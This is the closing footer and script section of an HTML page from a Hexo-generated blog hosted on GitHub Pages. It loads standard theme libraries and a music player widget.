                            <li>Made with <i class="fa fa-heart throb" style="color:#d43f57"></i> by <a href="https://candinya.com" target="_blank" rel="nofollow">Candinya</a>.</li>
                        </div>
                        <div>
                            <li>Hosted by <a href="https://github.io" target="_blank">Github Pages</a></li>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                        </div>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</footer>
</div>
</div>
<script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>

<script async src="/js/candy.min.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
    <div id="aplayer"></div>
<script>
$.ajax({
    type:"get",
    url:"",
    dataType:"json",
    success: function(data){
        new APlayer({
            container: document.getElementById('aplayer'),
            fixed: true,
            order: 'random',
            lrcType: 3,
            audio: data
        });
    }
});
</script>


    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>

    <script defer src="/js/kr-dark.min.js"></script>



</body>
</html>